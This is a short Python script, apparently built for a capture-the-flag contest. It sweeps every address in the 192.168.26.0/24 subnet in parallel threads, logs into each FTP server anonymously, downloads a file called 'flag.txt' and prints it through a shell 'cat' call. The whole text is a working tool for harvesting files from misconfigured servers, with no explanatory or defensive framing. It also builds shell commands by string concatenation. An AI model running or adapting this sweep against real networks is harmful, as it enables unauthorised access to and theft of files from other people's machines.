import sys,os,ftplib,threading
def mylogin(host):
	try:
		ftp=ftplib.FTP()
		#print(host)
		ftp.connect(host,21)
		ftp.login(user="Anonymous",passwd="")
		f=open(host,"wb")
		ftp.retrbinary("RETR flag.txt",f.write,1024)
		ftp.quit()
		f.close()
		c='cat '+host
		print(host)
		os.system(c)
	except Exception as e:
		sys.exit()

if __name__=='__main__':
	a=1
	while a<=254:
		h='192.168.26.'+str(a)
		t=threading.Thread(target=mylogin,args=(h,))
		t.start()
		a=a+1